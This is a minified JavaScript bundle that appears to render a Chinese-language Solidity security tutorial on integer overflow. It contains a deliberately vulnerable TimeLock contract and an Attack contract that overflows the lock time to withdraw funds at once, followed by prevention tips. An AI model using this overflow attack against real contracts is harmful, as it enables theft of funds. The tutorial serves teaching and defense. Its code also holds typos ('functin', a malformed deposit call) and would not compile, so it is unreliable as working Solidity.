"use strict";(self.webpackChunkweb_3_blog=self.webpackChunkweb_3_blog||[]).push([[5226],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>p});var r=t(7294);function i(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){i(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function c(e,n){if(null==e)return{};var t,r,i=function(e,n){if(null==e)return{};var t,r,i={},o=Object.keys(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||(i[t]=e[t]);return i}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)t=o[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(i[t]=e[t])}return i}var l=r.createContext({}),s=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},u=function(e){var n=s(e.components);return r.createElement(l.Provider,{value:n},e.children)},d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,i=e.mdxType,o=e.originalType,l=e.parentName,u=c(e,["components","mdxType","originalType","parentName"]),m=s(t),p=i,f=m["".concat(l,".").concat(p)]||m[p]||d[p]||o;return t?r.createElement(f,a(a({ref:n},u),{},{components:t})):r.createElement(f,a({ref:n},u))}));function p(e,n){var t=arguments,i=n&&n.mdxType;if("string"==typeof e||i){var o=t.length,a=new Array(o);a[0]=m;var c={};for(var l in n)hasOwnProperty.call(n,l)&&(c[l]=n[l]);c.originalType=e,c.mdxType="string"==typeof e?e:i,a[1]=c;for(var s=2;s<o;s++)a[s]=t[s];return r.createElement.apply(null,a)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},925:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>d,frontMatter:()=>o,metadata:()=>c,toc:()=>s});var r=t(7462),i=(t(7294),t(3905));const o={},a="\u7b97\u672f\u6ea2\u51fa\u6f0f\u6d1e",c={unversionedId:"solidity/solidity_hack/arithmetic_overflow_underflow",id:"solidity/solidity_hack/arithmetic_overflow_underflow",title:"\u7b97\u672f\u6ea2\u51fa\u6f0f\u6d1e",description:"\u5728 solidity < 0.8, \u6574\u6570\u6ea2\u51fa/\u4e0b\u6ea2\u662f\u6ca1\u6709\u4efb\u4f55\u9519\u8bef\u7684;",source:"@site/docs/solidity/solidity_hack/arithmetic_overflow_underflow.md",sourceDirName:"solidity/solidity_hack",slug:"/solidity/solidity_hack/arithmetic_overflow_underflow",permalink:"/docs/solidity/solidity_hack/arithmetic_overflow_underflow",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"solidity",previous:{title:"\u91cd\u5165\u6f0f\u6d1e",permalink:"/docs/solidity/solidity_hack/re_entrancy"},next:{title:"\u5408\u7ea6\u81ea\u6bc1\u6f0f\u6d1e",permalink:"/docs/solidity/solidity_hack/self_destruct"}},l={},s=[{value:"\u6f0f\u6d1e\u793a\u4f8b",id:"\u6f0f\u6d1e\u793a\u4f8b",level:3},{value:"\u9884\u9632\u6280\u672f",id:"\u9884\u9632\u6280\u672f",level:3}],u={toc:s};function d(e){let{components:n,...t}=e;return(0,i.kt)("wrapper",(0,r.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"\u7b97\u672f\u6ea2\u51fa\u6f0f\u6d1e"},"\u7b97\u672f\u6ea2\u51fa\u6f0f\u6d1e"),(0,i.kt)("p",null,"\u5728 solidity < 0.8, \u6574\u6570\u6ea2\u51fa/\u4e0b\u6ea2\u662f\u6ca1\u6709\u4efb\u4f55\u9519\u8bef\u7684;"),(0,i.kt)("p",null,"\u5728 solidity >= 0.8, \u6574\u6570\u6ea2\u51fa/\u4e0b\u6ea2\u662f\u4f1a\u629b\u51fa\u9519\u8bef\u7684\u3002"),(0,i.kt)("p",null,"\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728 >= 0.8\u7248\u672c\u4e0b\u4fee\u590d\u4e86\u6ea2\u51fa\u6f0f\u6d1e\u3002"),(0,i.kt)("h3",{id:"\u6f0f\u6d1e\u793a\u4f8b"},"\u6f0f\u6d1e\u793a\u4f8b"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n\n// \u5408\u7ea6\u7684\u8bbe\u8ba1\u76ee\u7684\u662f \u65f6\u95f4\u4fdd\u9669\n// \u7528\u6237\u53ef\u4ee5\u5411\u5408\u7ea6\u5b58\u5165eth, \u4f46\u662f\u4e00\u5468\u4e4b\u5185\u662f\u4e0d\u80fd\u591f\u63d0\u53d6\n// \u7528\u6237\u53ef\u4ee5\u5ef6\u957f\u4e00\u5468\u7684\u7b49\u5f85\u671f\n\n/*\n1. \u90e8\u7f72 TimeLock \u5408\u7ea6\n2. \u4f7f\u7528 TimeLock \u5730\u5740 \u90e8\u7f72 \u653b\u51fb\u5408\u7ea6\n3. \u8c03\u7528\u653b\u51fb\uff0c\u53d1\u9001 1 eth\u3002 \u6211\u4eec\u53ef\u4ee5\u7acb\u523b\u63d0\u53d6 ether\n\n\u53d1\u751f\u4e86\u4ec0\u4e48\uff1f\n    \u56e0\u4e3a TimeLock.LockTime \u6ea2\u51fa \u5bfc\u81f4\u53ef\u4ee5\u7acb\u523b\u63d0\u53d6\uff0c\u800c\u4e0d\u7528\u7b49\u5f85\u4e00\u5468\n*/\n\ncontract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n    \n    functin deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n    \n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease;\n    }\n    \n    function withdraw() public {\n        require(balances[msg.sender] > 0, "Insufficient funds");\n        require(block.timestamp > lockTime[msg.sender], "lock time not expired");\n        \n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n        \n        (bool sent, ) = msg.sender.call{value: amount}("");\n        require(sent, "Failed to send Ether");\n    }\n}\n\ncontract Attack {\n    TimeLock timeLock;\n    \n    constructor(TimeLock _timeLock){\n        timeLock = TimeLock(_timeLock);\n    };\n    \n    fallback() external payable{}\n\n    function attack() public payable {\n        timeLock.deposit{}(value: msg.value);\n         /*\n        if t = current lock time then we need to find x such that\n        x + t = 2**256 = 0\n        so x = -t\n        2**256 = type(uint).max + 1\n        so x = type(uint).max + 1 - t\n        */\n        timeLock.increaseLockTime(type(uint).max + 1 - timeLock.lockTime(address(this)));\n        \n        timeLock.withdraw();\n    }\n}\n')),(0,i.kt)("h3",{id:"\u9884\u9632\u6280\u672f"},"\u9884\u9632\u6280\u672f"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"\u4f7f\u7528 ",(0,i.kt)("inlineCode",{parentName:"li"},"SafeMath")," \u9632\u6b62\u7b97\u672f\u6ea2\u51fa"),(0,i.kt)("li",{parentName:"ul"},"\u4f7f\u7528 >=0.8 \u7684\u7248\u672c\u4f1a\u629b\u51fa error")))}d.isMDXComponent=!0}}]);